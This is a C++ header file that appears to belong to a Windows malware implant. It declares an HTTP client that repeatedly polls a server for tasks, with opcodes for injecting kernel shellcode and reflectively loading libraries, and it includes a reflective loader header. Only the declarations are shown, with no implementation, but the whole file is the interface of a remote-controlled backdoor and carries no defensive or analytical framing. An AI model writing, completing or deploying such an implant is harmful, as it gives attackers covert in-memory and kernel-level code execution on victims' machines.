#pragma once
#include "pch.h"
#include "ReflectiveLibraryLoader.h"
#include <boost/beast/core.hpp>
#include <boost/beast/http.hpp>
#include <boost/beast/version.hpp>
#include <boost/asio/ip/tcp.hpp>

namespace beast = boost::beast;     // from <boost/beast.hpp>
namespace http = beast::http;       // from <boost/beast/http.hpp>
namespace net = boost::asio;        // from <boost/asio.hpp>
using tcp = net::ip::tcp;           // from <boost/asio/ip/tcp.hpp>

const constexpr int KeepAlive = 0;

enum class ServerOpcode {
	InjectKernelShellcode = 1,
	LoadLibraryReflectively
};

enum class ClientOpcode {
	Success = 1,
	SuccessWithReturnedData,
	Failure
};

class HttpClient
{
private:
	static bool RequestHandler(ServerOpcode opcode, const void* inputBuffer, size_t inputBufferLength, void* outputBuffer, size_t* outputBufferLength);
public:
	static DWORD WINAPI FetchFromServerLoop(LPVOID Seconds);
	static void FetchFromServer();
};